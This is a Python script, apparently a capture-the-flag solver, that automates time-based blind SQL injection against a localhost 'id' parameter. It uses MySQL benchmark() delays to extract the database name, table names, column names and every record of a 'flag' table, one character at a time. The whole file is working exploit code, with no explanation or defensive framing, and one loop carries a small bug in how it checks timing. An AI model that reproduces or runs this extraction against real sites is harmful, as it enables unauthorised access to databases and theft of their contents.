#author:windy_2
import requests
urlx = 'http://127.0.0.1/?id= 1 and if((substr((select database()),'
payloads = 'qwertyuiopasdfghjklzxcvbnm{}_0123456789'

def guess_column(table):
    string = ''
    extend = 0
    list = []
    length2 = 0
    num = []
    num1 = []
    url1 = 'http://127.0.0.1/?id= 1 and if(((select count(column_name) from information_schema.columns where table_name=\''+ table + '\')='
    url2 = 'http://127.0.0.1/?id= 1 and if((substr((select column_name from information_schema.columns where table_name=\'' + table + '\' limit '
    url3 = 'http://127.0.0.1/?id= 1 and if(((select length(column_name) from information_schema.columns where table_name=\'' + table + '\' limit '
    url4 = 'http://127.0.0.1/?id= 1 and if(((substr((select '
    url5 = 'http://127.0.0.1/?id= 1 and if(((select count('
    url7 = 'http://127.0.0.1/?id= 1 and if(((select length('
    for i in range(50):                                               #获取字段数量
        url = url1 + str(i) + '),benchmark(1000000,md5(\'test\')),NULL); %23'
        r = requests.get(url)
        print(url)
        time = r.elapsed.total_seconds()
        print(time)
        if time > 1.5:
            extend = i
            length2 = i
            break
    for k in range(extend):                                 
        st = ''
        extend1 = 0
        for m in range(100):
            url = url3 + str(k) + ',1)=' + str(m) + '),benchmark(1000000,md5(\'test\')),NULL); %23'       #获取字段长度
            r = requests.get(url)
            if time > 1.5:
                extend1 = m
                break
        for i in range(1,extend1+1):         #获取字段
            for payload in payloads:
                url = url2 + str(k) + ',1),' + str(i) + ',1)=\'' + payload + '\'),benchmark(1000000,md5(\'test\')),NULL); %23'
                r = requests.get(url)
                time = r.elapsed.total_seconds()
                if time > 1.5:
                    print(url)
                    st += payload
                    break
        list.append(st)
        num1.append(st)
    length = 0
    for i in range(1,10000):                 #获取记录数量
        url = url5 + str(num1[0]) + ') from ' + table + ')=' + str(i) + '),benchmark(1000000,md5(\'test\')),NULL); %23'
        print(url)
        r = requests.get(url)
        time = r.elapsed.total_seconds()
        if time > 1.5:
            length = i
            break
    for column in list:
        str1 = ''
        for i in range(length):               
            length1 = 0
            url6 = url4 + str(column) + ' from ' + table + ' limit ' + str(i)
            for k in range(100):                  #获取记录长度
                url = url7 + str(column) + ') from '+ table + ' limit ' + str(i) + ',1)=' + str(k) + '),benchmark(1000000,md5(\'test\')),NULL); %23'
                r = requests.get(url)
                time = r.elapsed.total_seconds()
                if time > 1.5:
                    print(url)
                    length1 = k
                    break
            for n in range(1,length1+1):              #获取记录
                for payload in payloads:
                    url = url6 + ',1),' + str(n) + ',1))=\'' + str(payload) + '\'),benchmark(1000000,md5(\'test\')),NULL); %23' 
                    r = requests.get(url)
                    time = r.elapsed.total_seconds()
                    if time > 1.5:
                        print(url)
                        str1 += payload
                        break
            num.append(str1)
            str1 = ''
    for column in num1:
        print(column+'    ',end='')
    print('\n',end='')
    for i in range(length2):
        for k in range(length):
            x = i + length * k
            print(num[x]+'    ',end='')
        print('\n',end='')
def guess_table():
    string = ''
    extend = 0
    list = []
    url1 = 'http://127.0.0.1/?id= 1 and if(((select count(table_name) from information_schema.tables where table_schema=database())='
    url2 = 'http://127.0.0.1/?id= 1 and if((substr((select table_name from information_schema.tables where table_schema=database() limit '
    url3 = 'http://127.0.0.1/?id= 1 and if(((select length(table_name) from information_schema.tables where table_schema=database() limit '
    for i in range(50):
        url = url1 + str(i) + '),benchmark(1000000,md5(\'test\')),NULL); %23'
        r = requests.get(url)
        time = r.elapsed.total_seconds()
        if time > 1.5:
            extend = i
            break
    for k in range(extend):
        st = ''
        extend1 = 0
        for m in range(100):
            url = url3 + str(k) + ',1)=' + str(m) + '),benchmark(1000000,md5(\'test\')),NULL); %23'
            r = requests.get(url)
            time = r.elapsed.total_seconds()
            if time > 1.5:
                extend1 = m
                break
        for i in range(1,extend1+1):
            for payload in payloads:
                url = url2 + str(k) + ',1),' + str(i) + ',1)=\'' + payload + '\'),benchmark(1000000,md5(\'test\')),NULL); %23'
                r = requests.get(url)
                time = r.elapsed.total_seconds()
                if time > 1.5:
                    st += payload
                    break
        list.append(st)
    print('------------')
    for i in list:
        print(f'[*]{i}')
    print('------------')
    guess_column('flag')

def main():
    string = ''
    url1 = 'http://127.0.0.1/?id= 1 and if((length(database())='
    extend = 0
    for k in range(20):
        url = url1 + str(k) + '),benchmark(1000000,md5(\'test\')),NULL); %23'
        r = requests.get(url)
        time = r.elapsed.total_seconds()
        if time > 1.5:
            extend = k
            break
    for i in range(1,extend+1):
        for payload in payloads:
            url = urlx + str(i) + ',1)=\''
            url = url + payload + '\'),benchmark(1000000,md5(\'test\')),NULL); %23'
            r = requests.get(url)
            time = r.elapsed.total_seconds()
            if time > 1.5:
                string += payload
                break
    print(f'available database\n[*] {string}')
    guess_table()
    
main()